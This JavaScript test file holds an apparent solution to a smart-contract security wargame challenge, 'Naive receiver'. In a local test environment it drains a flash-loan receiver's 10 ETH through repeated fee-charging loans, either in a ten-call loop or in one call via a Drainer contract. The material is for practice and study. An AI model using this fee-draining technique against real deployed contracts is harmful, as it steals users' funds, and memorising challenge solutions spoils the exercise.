const { ether, balance } = require('@openzeppelin/test-helpers');
const { accounts, contract, web3 } = require('@openzeppelin/test-environment');

const LenderPool = contract.fromArtifact('NaiveReceiverLenderPool');
const Drainer = contract.fromArtifact('Drainer');
const FlashLoanReceiver = contract.fromArtifact('FlashLoanReceiver');

const { expect } = require('chai');

describe('[Challenge] Naive receiver', function () {
  const [deployer, user, attacker, ...otherAccounts] = accounts;

  // Pool has 1000 ETH in balance
  const ETHER_IN_POOL = ether('1000');

  // Receiver has 10 ETH in balance
  const ETHER_IN_RECEIVER = ether('10');

  before(async function () {
    /** SETUP - NO NEED TO CHANGE ANYTHING HERE */
    this.pool = await LenderPool.new({ from: deployer });
    await web3.eth.sendTransaction({
      from: deployer,
      to: this.pool.address,
      value: ETHER_IN_POOL,
    });

    expect(await balance.current(this.pool.address)).to.be.bignumber.equal(
      ETHER_IN_POOL,
    );
    expect(await this.pool.fixedFee({ from: deployer })).to.be.bignumber.equal(
      ether('1'),
    );

    this.receiver = await FlashLoanReceiver.new(this.pool.address, {
      from: user,
    });
    await web3.eth.sendTransaction({
      from: user,
      to: this.receiver.address,
      value: ETHER_IN_RECEIVER,
    });

    expect(await balance.current(this.receiver.address)).to.be.bignumber.equal(
      ETHER_IN_RECEIVER,
    );
  });

  it('Exploit', async function () {
    // Trivial solution with 10 txs
    // for (let i = 0; i < 10; i++) {
    //   await this.pool.flashLoan(this.receiver.address, ETHER_IN_RECEIVER, {
    //     from: attacker,
    //   });
    // }

    // Using a single tx with SC
    this.drainer = await Drainer.new(this.pool.address, { from: deployer });
    await this.drainer.drain(this.receiver.address, ETHER_IN_RECEIVER, 10);
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    // All ETH has been drained from the receiver
    expect(await balance.current(this.receiver.address)).to.be.bignumber.equal(
      '0',
    );
    expect(await balance.current(this.pool.address)).to.be.bignumber.equal(
      ETHER_IN_POOL.add(ETHER_IN_RECEIVER),
    );
  });
});
